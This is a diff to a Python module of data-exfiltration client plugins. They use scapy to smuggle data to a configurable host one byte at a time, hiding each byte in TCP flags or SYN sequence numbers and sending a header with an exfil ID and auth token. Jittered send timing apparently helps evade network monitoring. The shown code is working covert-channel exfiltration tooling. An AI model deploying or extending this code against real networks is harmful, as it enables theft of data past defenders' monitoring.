@@ -52,22 +52,22 @@ def _send_packet(pkt, iface: Optional[str] = None):
             ) from l2_err
 
 
+def _send_flags(dst, dport, b: int, iface: Optional[str] = None):
+    _prepare_scapy_cache()
+    from scapy.all import IP, TCP, RandShort
+    pkt = IP(dst=dst)/TCP(dport=int(dport), sport=RandShort(), flags=b & 0xFF, seq=1000)
+    _send_packet(pkt, iface=iface)
+
 def _send_syn(dst, dport, b: int, iface: Optional[str] = None):
     _prepare_scapy_cache()
     from scapy.all import IP, TCP, RandShort
     pkt = IP(dst=dst)/TCP(dport=int(dport), sport=RandShort(), flags='S', seq=SEQ_BASE + (b & 0xFF))
     _send_packet(pkt, iface=iface)
 
-def _send_ack(dst, dport, b: int, iface: Optional[str] = None):
-    _prepare_scapy_cache()
-    from scapy.all import IP, TCP, RandShort
-    pkt = IP(dst=dst)/TCP(dport=int(dport), sport=RandShort(), flags='A', seq=SEQ_BASE + (b & 0xFF), ack=1)
-    _send_packet(pkt, iface=iface)
-
-class TcpClientSynAck(ExfilClientPlugin):
+class TcpClientFlags(ExfilClientPlugin):
     canal = "TCP"
-    metodo = 1  # SYN-ACK
-    name = "tcp_client_synack"
+    metodo = 1  # FLAGS
+    name = "tcp_client_flags"
 
     def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
         host = config.get("host") or "127.0.0.1"
@@ -81,10 +81,10 @@ class TcpClientSynAck(ExfilClientPlugin):
         header = build_header_bytes(exfil_id, auth_token)
         sent = 0
         for b in header:
-            _send_syn(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
+            _send_flags(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
         for b in iter_bytes_from_chunks(payload_iter):
-            _send_syn(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
-        _send_syn(host, port, EOT, iface=iface); sent += 1
+            _send_flags(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
+        _send_flags(host, port, EOT, iface=iface); sent += 1
         return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_symbols": sent}
 
 class TcpClientSeq(ExfilClientPlugin):
@@ -104,10 +104,10 @@ class TcpClientSeq(ExfilClientPlugin):
         header = build_header_bytes(exfil_id, auth_token)
         sent = 0
         for b in header:
-            _send_ack(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
+            _send_syn(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
         for b in iter_bytes_from_chunks(payload_iter):
-            _send_ack(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
-        _send_ack(host, port, EOT, iface=iface); sent += 1
+            _send_syn(host, port, b, iface=iface); sent += 1; _sleep_rhythm(ritmo_base, ritmo_disp)
+        _send_syn(host, port, EOT, iface=iface); sent += 1
         return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_symbols": sent}
 
 class TcpClientLength(ExfilClientPlugin):
